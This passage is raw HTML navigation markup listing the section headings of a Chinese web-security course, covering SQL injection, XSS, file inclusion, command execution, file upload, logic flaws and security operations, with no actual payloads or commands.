href="#%E7%B1%BB%E5%88%AB"><span class="toc-text">类别</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-text">方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80"><span class="toc-text">SQL语句基础</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-2-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">4.3.2 SQL注入漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">SQL注入概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">SQL注入分类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%BD%A2%E6%88%90%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">SQL注入漏洞形成的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BESQL%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">寻找SQL注入点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-text">SQL注入的过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-3-SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">4.3.3 SQL报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">SQL报错注入概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B"><span class="toc-text">SQL报错注入实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-4-SQL%E7%9B%B2%E6%B3%A8"><span class="toc-text">4.3.4 SQL盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%E6%A6%82%E8%BF%B0"><span class="toc-text">SQL盲注概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">SQL盲注常用函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text">SQL盲注实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-5-HTTP%E6%96%87%E4%BB%B6%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">4.3.5 HTTP文件头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP-Header%E6%A6%82%E8%BF%B0"><span class="toc-text">HTTP Header概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP-Header%E6%B3%A8%E5%85%A5"><span class="toc-text">HTTP Header注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Referer%E6%B3%A8%E5%85%A5"><span class="toc-text">Referer注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#User-Agent%E6%B3%A8%E5%85%A5"><span class="toc-text">User-Agent注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#XFF%E6%B3%A8%E5%85%A5"><span class="toc-text">XFF注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-6-SQLMAP%E5%9F%BA%E7%A1%80"><span class="toc-text">4.3.6 SQLMAP基础</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMAP%E7%AE%80%E4%BB%8B"><span class="toc-text">SQLMAP简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMAP%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">SQLMAP基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#u%E5%8F%82%E6%95%B0%EF%BC%88GET%EF%BC%89"><span class="toc-text">-u参数（GET）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#r%E5%8F%82%E6%95%B0%EF%BC%88POST%EF%BC%89"><span class="toc-text">-r参数（POST）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#m%E5%8F%82%E6%95%B0%EF%BC%88%E5%A4%9A%E4%B8%AAURL%EF%BC%89"><span class="toc-text">-m参数（多个URL）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86-XSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第四部分 XSS漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-1-%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">4.4.1 会话管理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-text">Web会话管理概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-text">Web会话管理方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Eserver%E7%AB%AFsession%E7%9A%84%E7%AE%A1%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">基于server端session的管理的方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#cookie-based%E7%9A%84%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-text">cookie-based的管理方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#token-based%E7%9A%84%E7%AE%A1%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-text">token-based的管理方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">Web会话管理安全问题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-2-Session%E6%94%BB%E5%87%BB"><span class="toc-text">4.4.2 Session攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Session%E6%94%BB%E5%87%BB%E7%AE%80%E4%BB%8B"><span class="toc-text">Session攻击简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E9%A2%84%E6%B5%8B"><span class="toc-text">会话预测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-text">会话劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A"><span class="toc-text">会话固定</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-3-Cookie%E5%AE%89%E5%85%A8"><span class="toc-text">4.4.3 Cookie安全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%9C%BA%E5%88%B6"><span class="toc-text">Cookie机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%AD%98%E5%82%A8"><span class="toc-text">Cookie存储</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-4-HTTP%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8"><span class="toc-text">4.4.4 HTTP协议安全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Weak-Session-lDs-%E5%BC%B1%E4%BC%9A%E8%AF%9DIDs"><span class="toc-text">Weak Session lDs(弱会话IDs)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP%E5%8D%8F%E8%AE%AE%E5%AD%98%E5%9C%A8%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">HTTP协议存在的安全问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTPS%E5%8D%8F%E8%AE%AE"><span class="toc-text">HTTPS协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-5-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.4.5 XSS跨站脚本攻击–XSS漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">XSS漏洞概述</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-6-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93XSS%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-text">4.4.6 XSS跨站脚本攻击–XSS漏洞分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-text">DOM型XSS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-7-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E2%80%93Payload%E6%9E%84%E9%80%A0%E5%8F%8A%E5%8F%98%E5%BD%A2"><span class="toc-text">4.4.7 XSS跨站脚本攻击–Payload构造及变形</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-8-Cookie%E6%94%BB%E5%87%BB"><span class="toc-text">4.4.8 Cookie攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E5%9F%BA%E7%A1%80"><span class="toc-text">Cookie基础</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cookie%E6%94%BB%E5%87%BB"><span class="toc-text">Cookie攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-text">XSS钓鱼攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-9-XSS-Worm"><span class="toc-text">4.4.9 XSS Worm</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS-Worm%E4%BB%8B%E7%BB%8D"><span class="toc-text">XSS Worm介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS-Worm%E5%89%96%E6%9E%90"><span class="toc-text">XSS Worm剖析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A0%95%E8%99%AB%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B"><span class="toc-text">蠕虫攻击实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-10-XSS%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1"><span class="toc-text">4.4.10 XSS攻击防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS-Filter"><span class="toc-text">XSS Filter</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%96%B9%E6%B3%95"><span class="toc-text">过滤方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83"><span class="toc-text">Web安全编码规范</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-11-XSS%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-text">4.4.11 XSS相关工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E5%B7%A5%E5%85%B7"><span class="toc-text">XSS工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0"><span class="toc-text">XSS测试平台</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">XSS漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第五部分 文件包含漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">4.5 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">PHP文件包含</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">文件包含漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95%E5%B0%8F%E7%BB%93"><span class="toc-text">伪协议用法小结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第六部分 命令执行漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.6.1 命令执行漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%9A%E4%B9%89"><span class="toc-text">命令执行定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">命令执行的条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%88%90%E5%9B%A0"><span class="toc-text">命令执行成因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8D%B1%E5%AE%B3"><span class="toc-text">命令执行危害</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AE%9E%E4%BE%8B"><span class="toc-text">命令执行实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6%E5%8F%B7%E5%92%8C%E9%80%9A%E7%94%A8%E5%91%BD%E4%BB%A4%E7%AC%A6"><span class="toc-text">管道符号和通用命令符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="toc-text">命令执行常见场景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">4.6.2 远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">远程命令执行漏洞相关函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">远程命令执行漏洞的利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-3-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">4.6.3 系统命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6-4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-text">4.6.4 命令执行漏洞及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EDVWA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">基于DVWA的命令执行漏洞分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-text">命令执行漏洞防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E9%83%A8%E5%88%86-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第七部分 文件上传漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-1%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.7.1文件上传漏洞概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-2%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">4.7.2文件上传检测与绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-3-Web%E5%AE%B9%E5%99%A8%E5%8F%8AIIS"><span class="toc-text">4.7.3 Web容器及IIS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-4-Apache%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">4.7.4  Apache文件解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-5-Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">4.7.5 Nginx解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-6-Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">4.7.6 Tomcat任意文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-7-7-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1"><span class="toc-text">4.7.7 文件上传防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E9%83%A8%E5%88%86-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-text">第八部分 逻辑漏洞原理与验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">4.8.1 逻辑漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A6%82%E8%BF%B0"><span class="toc-text">访问控制概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">逻辑漏洞概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-text">验证机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">会话管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6"><span class="toc-text">权限控制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91"><span class="toc-text">业务逻辑</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-2-%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.2 验证机制问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6-1"><span class="toc-text">验证机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-text">验证机制设计缺陷</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E6%89%A7%E8%A1%8C%E7%BC%BA%E9%99%B7"><span class="toc-text">验证机制执行缺陷</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-3-%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.3 会话管理问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-4-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.4 权限控制问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-8-5-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-text">4.8.5 业务逻辑问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5"><span class="toc-text">第五章 网络安全运营</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%A6%82%E8%BF%B0"><span class="toc-text">第一部分 网络安全运营概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5"><span class="toc-text">5.1.1 什么是安全运营</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E8%83%8C%E6%99%AF"><span class="toc-text">安全运营背景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E5%92%8C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-text">安全运营和安全运营中心概念</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%9B%AE%E6%A0%87"><span class="toc-text">安全运营目标</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5"><span class="toc-text">如何实现安全运营</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-2-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%BA%A7%E5%93%81%E4%B8%8E%E6%A8%A1%E5%BC%8F"><span class="toc-text">5.1.2 安全运营产品与模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-3-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84"><span class="toc-text">5.1.3 安全运营技术架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-4-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%B5%81%E7%A8%8B"><span class="toc-text">5.1.4 安全运营流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%9C%8D%E5%8A%A1"><span class="toc-text">第二部分 网络安全运营服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-1-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%9C%8D%E5%8A%A1%E5%9F%BA%E7%A1%80"><span class="toc-text">5.2.1 安全运营服务基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-2-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF"><span class="toc-text">5.2.2 安全运营服务技术</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%B5%81%E7%A8%8B%E5%BB%BA%E8%AE%BE"><span class="toc-text">第三部分 网络安全运营流程建设</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-1-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E7%9A%84%E5%87%86%E5%A4%87%E5%92%8C%E8%A7%84%E5%88%92"><span class="toc-text">5.3.1 安全运营中心的准备和规划</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-2-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E7%9A%84%E5%AE%9E%E6%96%BD"><span class="toc-text">5.3.2 安全运营中心的实施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-3-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E7%9A%84%E8%BF%90%E8%90%A5%E5%92%8C%E6%94%B9%E8%BF%9B"><span class="toc-text">5.3.3 安全运营中心的运营和改进</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8"><span class="toc-text">第六章 企业安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 